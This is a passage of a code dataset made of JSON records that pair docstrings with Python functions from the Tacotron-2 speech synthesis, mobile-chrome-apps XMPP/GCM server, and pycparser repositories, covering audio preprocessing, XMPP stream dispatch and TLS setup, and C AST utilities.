"Tacotron-2/tacotron/models/attention.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "'''Pipeline for English text, including number and abbreviation expansion.'''\n", "func_signal": "def english_cleaners(text):\n", "code": "text = convert_to_ascii(text)\n# text = lowercase(text)\ntext = expand_numbers(text)\ntext = expand_abbreviations(text)\ntext = collapse_whitespace(text)\nreturn text", "path": "Tacotron-2/tacotron/utils/cleaners.py", "commit_date": "2018-10-07 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "\"\"\"Mu-Law companding + quantize\nArgs:\n\tx (array-like): Input signal. Each value of input signal must be in\n\t  range of [-1, 1].\n\tmu (number): Compression parameter ``\u03bc``.\nReturns:\n\tarray-like: Quantized signal (dtype=int)\n\t  - y \u2208 [0, mu] if x \u2208 [-1, 1]\n\t  - y \u2208 [0, mu) if x \u2208 [-1, 1)\n.. note::\n\tIf you want to get quantized values of range [0, mu) (not [0, mu]),\n\tthen you need to provide input signal of range [-1, 1).\nExamples:\n\t>>> from scipy.io import wavfile\n\t>>> import pysptk\n\t>>> import numpy as np\n\t>>> from nnmnkwii import preprocessing as P\n\t>>> fs, x = wavfile.read(pysptk.util.example_audio_file())\n\t>>> x = (x / 32768.0).astype(np.float32)\n\t>>> y = P.mulaw_quantize(x)\n\t>>> print(y.min(), y.max(), y.dtype)\n\t15 246 int64\nSee also:\n\t:func:`nnmnkwii.preprocessing.mulaw`\n\t:func:`nnmnkwii.preprocessing.inv_mulaw`\n\t:func:`nnmnkwii.preprocessing.inv_mulaw_quantize`\n\"\"\"\n", "func_signal": "def mulaw_quantize(x, mu=256):\n", "code": "mu = 255\ny = mulaw(x, mu)\n# scale [-1, 1] to [0, mu]\nreturn _asint((y + 1) / 2 * mu)", "path": "Tacotron-2/wavenet_vocoder/util.py", "commit_date": "2019-01-04 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "\"\"\"\nPreprocesses a single utterance wav/text pair\n\nthis writes the mel scale spectogram to disk and return a tuple to write\nto the train.txt file\n\nArgs:\n\t- mel_dir: the directory to write the mel spectograms into\n\t- linear_dir: the directory to write the linear spectrograms into\n\t- wav_dir: the directory to write the preprocessed wav into\n\t- index: the numeric index to use in the spectrogram filename\n\t- wav_path: path to the audio file containing the speech input\n\t- text: text spoken in the input audio file\n\t- hparams: hyper parameters\n\nReturns:\n\t- A tuple: (audio_filename, mel_filename, linear_filename, time_steps, mel_frames, linear_frames, text)\n\"\"\"\n", "func_signal": "def _process_utterance(mel_dir, wav_dir, index, wav_path, hparams):\n", "code": "try:\n\t# Load the audio as numpy array\n\twav = audio.load_wav(wav_path, sr=hparams.sample_rate)\nexcept FileNotFoundError: #catch missing wav exception\n\tprint('file {} present in csv metadata is not present in wav folder. skipping!'.format(\n\t\twav_path))\n\treturn None\n\n#M-AILABS extra silence specific\nif hparams.trim_silence:\n\twav = audio.trim_silence(wav, hparams)\n\n#Pre-emphasize\npreem_wav = audio.preemphasis(wav, hparams.preemphasis, hparams.preemphasize)\n\n#rescale wav\nif hparams.rescale:\n\twav = wav / np.abs(wav).max() * hparams.rescaling_max\n\tpreem_wav = preem_wav / np.abs(preem_wav).max() * hparams.rescaling_max\n\n\t#Assert all audio is in [-1, 1]\n\tif (wav > 1.).any() or (wav < -1.).any():\n\t\traise RuntimeError('wav has invalid value: {}'.format(wav_path))\n\tif (preem_wav > 1.).any() or (preem_wav < -1.).any():\n\t\traise RuntimeError('wav has invalid value: {}'.format(wav_path))\n\n#Mu-law quantize\nif is_mulaw_quantize(hparams.input_type):\n\t#[0, quantize_channels)\n\tout = mulaw_quantize(wav, hparams.quantize_channels)\n\n\t#Trim silences\n\tstart, end = audio.start_and_end_indices(out, hparams.silence_threshold)\n\twav = wav[start: end]\n\tpreem_wav = preem_wav[start: end]\n\tout = out[start: end]\n\n\tconstant_values = mulaw_quantize(0, hparams.quantize_channels)\n\tout_dtype = np.int16\n\nelif is_mulaw(hparams.input_type):\n\t#[-1, 1]\n\tout = mulaw(wav, hparams.quantize_channels)\n\tconstant_values = mulaw(0., hparams.quantize_channels)\n\tout_dtype = np.float32\n\nelse:\n\t#[-1, 1]\n\tout = wav\n\tconstant_values = 0.\n\tout_dtype = np.float32\n\n# Compute the mel scale spectrogram from the wav\nmel_spectrogram = audio.melspectrogram(preem_wav, hparams).astype(np.float32)\nmel_frames = mel_spectrogram.shape[1]\n\nif mel_frames > hparams.max_mel_frames and hparams.clip_mels_length:\n\treturn None\n\nif hparams.use_lws:\n\t#Ensure time resolution adjustement between audio and mel-spectrogram\n\tfft_size = hparams.n_fft if hparams.win_size is None else hparams.win_size\n\tl, r = audio.pad_lr(wav, fft_size, audio.get_hop_size(hparams))\n\n\t#Zero pad audio signal\n\tout = np.pad(out, (l, r), mode='constant', constant_values=constant_values)\nelse:\n\t#Ensure time resolution adjustement between audio and mel-spectrogram\n\tl_pad, r_pad = audio.librosa_pad_lr(wav, hparams.n_fft, audio.get_hop_size(hparams))\n\n\t#Reflect pad audio signal (Just like it's done in Librosa to avoid frame inconsistency)\n\tout = np.pad(out, (l_pad, r_pad), mode='constant', constant_values=constant_values)\n\nassert len(out) >= mel_frames * audio.get_hop_size(hparams)\n\n#time resolution adjustement\n#ensure length of raw audio is multiple of hop size so that we can use\n#transposed convolution to upsample\nout = out[:mel_frames * audio.get_hop_size(hparams)]\nassert len(out) % audio.get_hop_size(hparams) == 0\ntime_steps = len(out)\n\n# Write the spectrogram and audio to disk\naudio_filename = os.path.join(wav_dir, 'audio-{}.npy'.format(index))\nmel_filename = os.path.join(mel_dir, 'mel-{}.npy'.format(index))\nnp.save(audio_filename, out.astype(out_dtype), allow_pickle=False)\nnp.save(mel_filename, mel_spectrogram.T, allow_pickle=False)\n\n#global condition features\nif hparams.gin_channels > 0:\n\traise RuntimeError('When activating global conditions, please set your speaker_id rules in line 129 of datasets/wavenet_preprocessor.py to use them during training')\n\tspeaker_id = '<no_g>' #put the rule to determine how to assign speaker ids (using file names maybe? file basenames are available in \"index\" variable)\nelse:\n\tspeaker_id = '<no_g>'\n\n# Return a tuple describing this training example\nreturn (audio_filename, mel_filename, mel_filename, speaker_id, time_steps, mel_frames)", "path": "Tacotron-2/datasets/wavenet_preprocessor.py", "commit_date": "2019-01-26 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "'''Basic pipeline that lowercases and collapses whitespace without transliteration.'''\n", "func_signal": "def basic_cleaners(text):\n", "code": "text = lowercase(text)\ntext = collapse_whitespace(text)\nreturn text", "path": "Tacotron-2/tacotron/utils/cleaners.py", "commit_date": "2018-10-07 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "'''Evaluate model during training.\nSupposes that model variables are averaged.\n'''\n", "func_signal": "def eval_step(sess, global_step, model, plot_dir, wav_dir, summary_writer, hparams, model_name):\n", "code": "start_time = time.time()\ny_hat, y_target, loss, input_mel, upsampled_features = sess.run([model.tower_y_hat[0], model.tower_y_target[0],\n\tmodel.eval_loss, model.tower_eval_c[0], model.tower_eval_upsampled_local_features[0]])\nduration = time.time() - start_time\nlog('Time Evaluation: Generation of {} audio frames took {:.3f} sec ({:.3f} frames/sec)'.format(\n\tlen(y_target), duration, len(y_target)/duration))\n\n#Make audio and plot paths\npred_wav_path = os.path.join(wav_dir, 'step-{}-pred.wav'.format(global_step))\ntarget_wav_path = os.path.join(wav_dir, 'step-{}-real.wav'.format(global_step))\nplot_path = os.path.join(plot_dir, 'step-{}-waveplot.png'.format(global_step))\nmel_path = os.path.join(plot_dir, 'step-{}-reconstruction-mel-spectrogram.png'.format(global_step))\nupsampled_path = os.path.join(plot_dir, 'step-{}-upsampled-features.png'.format(global_step))\n\n#Save figure\nutil.waveplot(plot_path, y_hat, y_target, model._hparams, title='{}, {}, step={}, loss={:.5f}'.format(model_name, time_string(), global_step, loss))\nlog('Eval loss for global step {}: {:.3f}'.format(global_step, loss))\n\n#Compare generated wav mel with original input mel to evaluate wavenet audio reconstruction performance\n#Both mels should match on low frequency information, wavenet mel should contain more high frequency detail when compared to Tacotron mels.\nT2_output_range = (-hparams.max_abs_value, hparams.max_abs_value) if hparams.symmetric_mels else (0, hparams.max_abs_value)\ngenerated_mel = _interp(melspectrogram(y_hat, hparams).T, T2_output_range)\nutil.plot_spectrogram(generated_mel, mel_path, title='Local Condition vs Reconst. Mel-Spectrogram, step={}, loss={:.5f}'.format(\n\tglobal_step, loss), target_spectrogram=input_mel.T)\nutil.plot_spectrogram(upsampled_features.T, upsampled_path, title='Upsampled Local Condition features, step={}, loss={:.5f}'.format(\n\tglobal_step, loss), auto_aspect=True)\n\n#Save Audio\nsave_wavenet_wav(y_hat, pred_wav_path, sr=hparams.sample_rate, inv_preemphasize=hparams.preemphasize, k=hparams.preemphasis)\nsave_wavenet_wav(y_target, target_wav_path, sr=hparams.sample_rate, inv_preemphasize=hparams.preemphasize, k=hparams.preemphasis)\n\n#Write eval summary to tensorboard\nlog('Writing eval summary!')\nadd_test_stats(summary_writer, global_step, loss, hparams=hparams)", "path": "Tacotron-2/wavenet_vocoder/train.py", "commit_date": "2019-01-25 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "'''Converts a string of text to a sequence of IDs corresponding to the symbols in the text.\n\n  The text can optionally have ARPAbet sequences enclosed in curly braces embedded\n  in it. For example, \"Turn left on {HH AW1 S S T AH0 N} Street.\"\n\n  Args:\n    text: string to convert to a sequence\n    cleaner_names: names of the cleaner functions to run the text through\n\n  Returns:\n    List of integers corresponding to the symbols in the text\n'''\n", "func_signal": "def text_to_sequence(text, cleaner_names):\n", "code": "sequence = []\n\n# Check for curly braces and treat their contents as ARPAbet:\nwhile len(text):\n  m = _curly_re.match(text)\n  if not m:\n    sequence += _symbols_to_sequence(_clean_text(text, cleaner_names))\n    break\n  sequence += _symbols_to_sequence(_clean_text(m.group(1), cleaner_names))\n  sequence += _arpabet_to_sequence(m.group(2))\n  text = m.group(3)\n\n# Append EOS token\nsequence.append(_symbol_to_id['~'])\nreturn sequence", "path": "Tacotron-2/tacotron/utils/text.py", "commit_date": "2018-08-07 00:00:00", "repo_name": "Rayhane-mamah/Tacotron-2", "stars": 2225, "license": "mit", "language": "python", "size": 9378}
{"docstring": "\"\"\" Unregisters TLS handler's from owner's dispatcher. Take note that encription\n    can not be stopped once started. You can only break the connection and start over.\"\"\"\n", "func_signal": "def plugout(self,now=0):\n", "code": "self._owner.UnregisterHandler('features',self.FeaturesHandler,xmlns=NS_STREAMS)\nself._owner.UnregisterHandler('proceed',self.StartTLSHandler,xmlns=NS_TLS)\nself._owner.UnregisterHandler('failure',self.StartTLSHandler,xmlns=NS_TLS)", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/transports.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Fire up connection. Return non-empty string on success.\n    Also registers self.disconnected method in the owner's dispatcher.\n    Called internally. \"\"\"\n", "func_signal": "def plugin(self, owner):\n", "code": "if not self._server: self._server=(self._owner.Server,5222)\nif self.use_srv: server=self.srv_lookup(self._server)\nelse: server=self._server\nif not self.connect(server): return\nself._owner.Connection=self\nself._owner.RegisterDisconnectHandler(self.disconnected)\nreturn 'ok'", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/transports.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Send a stream terminator and and handle all incoming stanzas before stream closure. \"\"\"\n", "func_signal": "def disconnect(self):\n", "code": "self._owner_send('</stream:stream>')\nwhile self.Process(1): pass", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Used to analyse server <features/> tag for TLS support.\n    If TLS is supported starts the encryption negotiation. Used internally\"\"\"\n", "func_signal": "def FeaturesHandler(self, conn, feats):\n", "code": "if not feats.getTag('starttls',namespace=NS_TLS):\n    self.DEBUG(\"TLS unsupported by remote server.\",'warn')\n    return\nself.DEBUG(\"TLS supported by remote server. Requesting TLS start.\",'ok')\nself._owner.RegisterHandlerOnce('proceed',self.StartTLSHandler,xmlns=NS_TLS)\nself._owner.RegisterHandlerOnce('failure',self.StartTLSHandler,xmlns=NS_TLS)\nself._owner.Connection.send('<starttls xmlns=\"%s\"/>'%NS_TLS)\nraise NodeProcessed", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/transports.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" If the 'now' argument is true then starts using encryption immidiatedly.\n    If 'now' in false then starts encryption as soon as TLS feature is\n    declared by the server (if it were already declared - it is ok).\n\"\"\"\n", "func_signal": "def PlugIn(self,owner,now=0):\n", "code": "if owner.__dict__.has_key('TLS'): return  # Already enabled.\nPlugIn.PlugIn(self,owner)\nDBG_LINE='TLS'\nif now: return self._startSSL()\nif self._owner.Dispatcher.Stream.features:\n    try: self.FeaturesHandler(self._owner.Dispatcher,self._owner.Dispatcher.Stream.features)\n    except NodeProcessed: pass\nelse: self._owner.RegisterHandlerOnce('features',self.FeaturesHandler,xmlns=NS_STREAMS)\nself.starttls=None", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/transports.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Disconnect from the remote server and unregister self.disconnected method from\n    the owner's dispatcher. \"\"\"\n", "func_signal": "def plugout(self):\n", "code": "self._sock.close()\nif self._owner.__dict__.has_key('Connection'):\n    del self._owner.Connection\n    self._owner.UnregisterDisconnectHandler(self.disconnected)", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/transports.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Plug the Dispatcher instance into Client class instance and send initial stream header. Used internally.\"\"\"\n", "func_signal": "def plugin(self, owner):\n", "code": "self._init()\nfor method in self._old_owners_methods:\n    if method.__name__=='send': self._owner_send=method; break\nself._owner.lastErrNode=None\nself._owner.lastErr=None\nself._owner.lastErrCode=None\nself.StreamInit()", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Unregister handler. \"typ\" and \"ns\" must be specified exactly the same as with registering.\"\"\"\n", "func_signal": "def UnregisterHandler(self,name,handler,typ='',ns='',xmlns=None):\n", "code": "if not xmlns: xmlns=self._owner.defaultNamespace\nif not self.handlers.has_key(xmlns): return\nif not typ and not ns: typ='default'\nfor pack in self.handlers[xmlns][name][typ+ns]:\n    if handler==pack['func']: break\nelse: pack=None\ntry: self.handlers[xmlns][name][typ+ns].remove(pack)\nexcept ValueError: pass", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Block and wait until stanza with specific \"id\" attribute will come.\n    If no such stanza is arrived within timeout, return None.\n    If operation failed for some reason then owner's attributes\n    lastErrNode, lastErr and lastErrCode are set accordingly. \"\"\"\n", "func_signal": "def WaitForResponse(self, ID, timeout=DefaultTimeout):\n", "code": "self._expected[ID]=None\nhas_timed_out=0\nabort_time=time.time() + timeout\nself.DEBUG(\"Waiting for ID:%s with timeout %s...\" % (ID,timeout),'wait')\nwhile not self._expected[ID]:\n    if not self.Process(0.04):\n        self._owner.lastErr=\"Disconnect\"\n        return None\n    if time.time() > abort_time:\n        self._owner.lastErr=\"Timeout\"\n        return None\nresponse=self._expected[ID]\ndel self._expected[ID]\nif response.getErrorCode():\n    self._owner.lastErrNode=response\n    self._owner.lastErr=response.getError()\n    self._owner.lastErrCode=response.getErrorCode()\nreturn response", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Prepares instance to be destructed. \"\"\"\n", "func_signal": "def plugout(self):\n", "code": "self.Stream.dispatch=None\nself.Stream.DEBUG=None\nself.Stream.features=None\nself.Stream.destroy()", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Used to declare some top-level stanza name to dispatcher.\n   Needed to start registering handlers for such stanzas.\n   Iq, message and presence protocols are registered by default. \"\"\"\n", "func_signal": "def RegisterProtocol(self,tag_name,Proto,xmlns=None,order='info'):\n", "code": "if not xmlns: xmlns=self._owner.defaultNamespace\nself.DEBUG('Registering protocol \"%s\" as %s(%s)'%(tag_name,Proto,xmlns), order)\nself.handlers[xmlns][tag_name]={type:Proto, 'default':[]}", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Creates internal structures for newly registered namespace.\n    You can register handlers for this namespace afterwards. By default one namespace\n    already registered (jabber:client or jabber:component:accept depending on context. \"\"\"\n", "func_signal": "def RegisterNamespace(self,xmlns,order='info'):\n", "code": "self.DEBUG('Registering namespace \"%s\"'%xmlns,order)\nself.handlers[xmlns]={}\nself.RegisterProtocol('unknown',Protocol,xmlns=xmlns)\nself.RegisterProtocol('default',Protocol,xmlns=xmlns)", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Return stanza back to the sender with <feature-not-implemennted/> error set. \"\"\"\n", "func_signal": "def returnStanzaHandler(self,conn,stanza):\n", "code": "if stanza.getType() in ['get','set']:\n    conn.send(Error(stanza,ERR_FEATURE_NOT_IMPLEMENTED))", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Unregister handler after first call (not implemented yet). \"\"\"\n", "func_signal": "def RegisterHandlerOnce(self,name,handler,typ='',ns='',xmlns=None,makefirst=0, system=0):\n", "code": "if not xmlns: xmlns=self._owner.defaultNamespace\nself.RegisterHandler(name, handler, typ, ns, xmlns, makefirst, system)", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Closes the socket. \"\"\"\n", "func_signal": "def disconnect(self):\n", "code": "self.DEBUG(\"Closing socket\",'stop')\nself._sock.close()", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/transports.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Registers default namespaces/protocols/handlers. Used internally.  \"\"\"\n", "func_signal": "def _init(self):\n", "code": "self.RegisterNamespace('unknown')\nself.RegisterNamespace(NS_STREAMS)\nself.RegisterNamespace(self._owner.defaultNamespace)\nself.RegisterProtocol('iq',Iq)\nself.RegisterProtocol('presence',Presence)\nself.RegisterProtocol('message',Message)\nself.RegisterDefaultHandler(self.returnStanzaHandler)\nself.RegisterHandler('error',self.streamErrorHandler,xmlns=NS_STREAMS)", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Starts connection. Used interally. Returns non-empty string on success.\"\"\"\n", "func_signal": "def plugin(self, owner):\n", "code": "owner.debug_flags.append(DBG_CONNECT_PROXY)\nreturn TCPsocket.plugin(self,owner)", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/transports.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\"Register user callback as stanzas handler of declared type. Callback must take\n   (if chained, see later) arguments: dispatcher instance (for replying), incomed\n   return of previous handlers.\n   The callback must raise xmpp.NodeProcessed just before return if it want preven\n   callbacks to be called with the same stanza as argument _and_, more importantly\n   library from returning stanza to sender with error set (to be enabled in 0.2 ve\n    Arguments:\n      \"name\" - name of stanza. F.e. \"iq\".\n      \"handler\" - user callback.\n      \"typ\" - value of stanza's \"type\" attribute. If not specified any value match\n      \"ns\" - namespace of child that stanza must contain.\n      \"chained\" - chain together output of several handlers.\n      \"makefirst\" - insert handler in the beginning of handlers list instead of\n        adding it to the end. Note that more common handlers (i.e. w/o \"typ\" and \"\n        will be called first nevertheless.\n      \"system\" - call handler even if NodeProcessed Exception were raised already.\n    \"\"\"\n", "func_signal": "def RegisterHandler(self,name,handler,typ='',ns='',xmlns=None, makefirst=0, system=0):\n", "code": "if not xmlns: xmlns=self._owner.defaultNamespace\nself.DEBUG('Registering handler %s for \"%s\" type->%s ns->%s(%s)'%(handler,name,typ,ns,xmlns), 'info')\nif not typ and not ns: typ='default'\nif not self.handlers.has_key(xmlns): self.RegisterNamespace(xmlns,'warn')\nif not self.handlers[xmlns].has_key(name): self.RegisterProtocol(name,Protocol,xmlns,'warn')\nif not self.handlers[xmlns][name].has_key(typ+ns): self.handlers[xmlns][name][typ+ns]=[]\nif makefirst: self.handlers[xmlns][name][typ+ns].insert(0,{'func':handler,'system':system})\nelse: self.handlers[xmlns][name][typ+ns].append({'func':handler,'system':system})", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Cache connection point 'server'. 'server' is the tuple of (host, port)\n    absolutely the same as standard tcp socket uses. However library will lookup for \n    ('_xmpp-client._tcp.' + host) SRV record in DNS and connect to the found (if it is)\n    server instead\n\"\"\"\n", "func_signal": "def __init__(self, server=None, use_srv=True):\n", "code": "PlugIn.__init__(self)\nself.DBG_LINE='socket'\nself._exported_methods=[self.send,self.disconnect]\nself._server, self.use_srv = server, use_srv", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/transports.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\" Send an initial stream header. \"\"\"\n", "func_signal": "def StreamInit(self):\n", "code": "self.Stream=simplexml.NodeBuilder()\nself.Stream._dispatch_depth=2\nself.Stream.dispatch=self.dispatch\nself.Stream.stream_header_received=self._check_stream_start\nself._owner.debug_flags.append(simplexml.DBG_NODEBUILDER)\nself.Stream.DEBUG=self._owner.DEBUG\nself.Stream.features=None\nself._metastream=Node('stream:stream')\nself._metastream.setNamespace(self._owner.Namespace)\nself._metastream.setAttr('version','1.0')\nself._metastream.setAttr('xmlns:stream',NS_STREAMS)\nself._metastream.setAttr('to',self._owner.Server)\nself._owner.send(\"<?xml version='1.0'?>%s>\"%str(self._metastream)[:-2])", "path": "mobile-chrome-apps/chrome-cordova/gcmServer/xmpp/dispatcher.py", "commit_date": "2014-09-14 00:00:00", "repo_name": "MobileChromeApps/mobile-chrome-apps", "stars": 2496, "license": "bsd-3-clause", "language": "python", "size": 35043}
{"docstring": "\"\"\"\nGiven a Node class, get a set of child attrs.\nMemoized to avoid highly repetitive string manipulation\n\n\"\"\"\n", "func_signal": "def child_attrs_of(klass):\n", "code": "non_child_attrs = set(klass.attr_names)\nall_attrs = set([i for i in klass.__slots__ if not RE_INTERNAL_ATTR.match(i)])\nreturn all_attrs - non_child_attrs", "path": "pycparser/examples/c_json.py", "commit_date": "2017-03-05 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Pretty print the Node and all its attributes and\n    children (recursively) to a buffer.\n\n    buf:\n        Open IO buffer into which the Node is printed.\n\n    offset:\n        Initial offset (amount of leading spaces)\n\n    attrnames:\n        True if you want to see the attribute names in\n        name=value pairs. False to only see the values.\n\n    nodenames:\n        True if you want to see the actual node names\n        within their parents.\n\n    showcoord:\n        Do you want the coordinates of each Node to be\n        displayed.\n\"\"\"\n", "func_signal": "def show(self, buf=sys.stdout, offset=0, attrnames=False, nodenames=False, showcoord=False, _my_node_name=None):\n", "code": "lead = ' ' * offset\nif nodenames and _my_node_name is not None:\n    buf.write(lead + self.__class__.__name__+ ' <' + _my_node_name + '>: ')\nelse:\n    buf.write(lead + self.__class__.__name__+ ': ')\n\nif self.attr_names:\n    if attrnames:\n        nvlist = [(n, getattr(self,n)) for n in self.attr_names]\n        attrstr = ', '.join('%s=%s' % nv for nv in nvlist)\n    else:\n        vlist = [getattr(self, n) for n in self.attr_names]\n        attrstr = ', '.join('%s' % v for v in vlist)\n    buf.write(attrstr)\n\nif showcoord:\n    buf.write(' (at %s)' % self.coord)\nbuf.write('\\n')\n\nfor (child_name, child) in self.children():\n    child.show(\n        buf,\n        offset=offset + 2,\n        attrnames=attrnames,\n        nodenames=nodenames,\n        showcoord=showcoord,\n        _my_node_name=child_name)", "path": "pycparser/pycparser/_ast_gen.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Initialize the code generator from a configuration\n    file.\n\"\"\"\n", "func_signal": "def __init__(self, cfg_filename='_c_ast.cfg'):\n", "code": "self.cfg_filename = cfg_filename\nself.node_cfg = [NodeCfg(name, contents)\n    for (name, contents) in self.parse_cfgfile(cfg_filename)]", "path": "pycparser/pycparser/_ast_gen.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Generates a python representation of the current node\n\"\"\"\n", "func_signal": "def __repr__(self):\n", "code": "result = self.__class__.__name__ + '('\n\nindent = ''\nseparator = ''\nfor name in self.__slots__[:-2]:\n    result += separator\n    result += indent\n    result += name + '=' + (_repr(getattr(self, name)).replace('\\n', '\\n  ' + (' ' * (len(name) + len(self.__class__.__name__)))))\n\n    separator = ','\n    indent = '\\n ' + (' ' * len(self.__class__.__name__))\n\nresult += indent + ')'\n\nreturn result", "path": "pycparser/pycparser/c_ast.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Called if no explicit visitor function exists for a\n    node. Implements preorder visiting of the node.\n\"\"\"\n", "func_signal": "def generic_visit(self, node):\n", "code": "for c in node:\n    self.visit(c)", "path": "pycparser/pycparser/_ast_gen.py", "commit_date": "2020-04-15 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\" Fast memoization decorator for a function taking a single argument \"\"\"\n", "func_signal": "def memodict(fn):\n", "code": "class memodict(dict):\n    def __missing__(self, key):\n        ret = self[key] = fn(key)\n        return ret\nreturn memodict().__getitem__", "path": "pycparser/examples/c_json.py", "commit_date": "2017-03-05 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
{"docstring": "\"\"\"\nConvert an object in the dict representation into an object.\nNote: Mutually recursive with from_dict.\n\n\"\"\"\n", "func_signal": "def _convert_to_obj(value):\n", "code": "value_type = type(value)\nif value_type == dict:\n    return from_dict(value)\nelif value_type == list:\n    return [_convert_to_obj(item) for item in value]\nelse:\n    # String\n    return value", "path": "pycparser/examples/c_json.py", "commit_date": "2017-03-05 00:00:00", "repo_name": "eliben/pycparser", "stars": 3083, "license": "other", "language": "python", "size": 1226}
